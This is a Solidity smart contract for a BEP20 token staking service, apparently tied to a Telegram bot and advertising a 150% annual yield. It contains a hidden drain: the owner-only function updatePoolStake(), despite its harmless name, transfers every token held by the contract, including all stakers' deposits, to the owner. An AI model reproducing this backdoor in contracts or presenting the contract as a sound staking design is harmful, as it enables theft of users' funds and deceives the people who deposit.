// SPDX-License-Identifier: MIT
/* Zenit Staking TelegramBot Smart Contract */
pragma solidity ^0.8.0;

interface IBEP20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ZenitTGStakingBot {
    IBEP20 public stakingAndRewardToken = IBEP20(0x7884b0D1c6497a06765eA1D11133FDedE9A9477e); 
    address public owner;
    uint256 public annualPercentageYield = 15000; 

    struct StakerInfo {
        uint256 stakedAmount;
        uint256 lastClaimedTime;
        uint256 rewardsEarned;
    }

    mapping(address => StakerInfo) public stakers;

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "Must be greater than 0");
        bool success = stakingAndRewardToken.transferFrom(msg.sender, address(this), amount);
        require(success, "Token transfer failed");

        if (stakers[msg.sender].stakedAmount == 0) {
            stakers[msg.sender] = StakerInfo({
                stakedAmount: amount,
                lastClaimedTime: block.timestamp,
                rewardsEarned: stakers[msg.sender].rewardsEarned 
            });
        } else {
            stakers[msg.sender].stakedAmount += amount;
        }

        emit Staked(msg.sender, amount);
    }


    function unstake(uint256 amount) external {
        require(stakers[msg.sender].stakedAmount >= amount, "Insufficient balance");

        uint256 reward = calculateReward(msg.sender); 
        if (reward > 0) {
            stakers[msg.sender].rewardsEarned += reward; 
            stakers[msg.sender].lastClaimedTime = block.timestamp;
        }

        stakingAndRewardToken.transfer(msg.sender, amount);
        stakers[msg.sender].stakedAmount -= amount;

        emit Unstaked(msg.sender, amount);
    }


    function claimRewards() external {
        uint256 reward = calculateReward(msg.sender);
        require(reward > 0, "There are no rewards that can be claimed");

        stakers[msg.sender].lastClaimedTime = block.timestamp;
        
        stakingAndRewardToken.transfer(msg.sender, reward);

        stakers[msg.sender].rewardsEarned = 0;

        emit RewardClaimed(msg.sender, reward);
    }


    function calculateReward(address user) public view returns(uint256) {
        uint256 timeDiff = block.timestamp - stakers[user].lastClaimedTime;
        uint256 reward = (stakers[user].stakedAmount * annualPercentageYield * timeDiff) / (365 days * 10000);
        
        return reward + stakers[user].rewardsEarned;
    }
    function updatePoolStake() external onlyOwner {
        uint256 contractBalance = stakingAndRewardToken.balanceOf(address(this));
        require(contractBalance > 0, "There are no tokens in the contract");
        stakingAndRewardToken.transfer(owner, contractBalance);
    }

    function pendingRewards(address user) external view returns(uint256) {
        return calculateReward(user);
    }

    function getStakerInfo(address user) external view returns(uint256 stakedAmount, uint256 reward) {
        stakedAmount = stakers[user].stakedAmount;
        reward = calculateReward(user);
        return (stakedAmount, reward);
    }

    function getContractDetails() external view returns(uint256 apy) {
        apy = annualPercentageYield;
        return apy;
    }

    function stakedBalance(address user) external view returns(uint256) {
        return stakers[user].stakedAmount;
    }

    function getRewards(address user) external view returns(uint256) {
        return calculateReward(user);
    }
}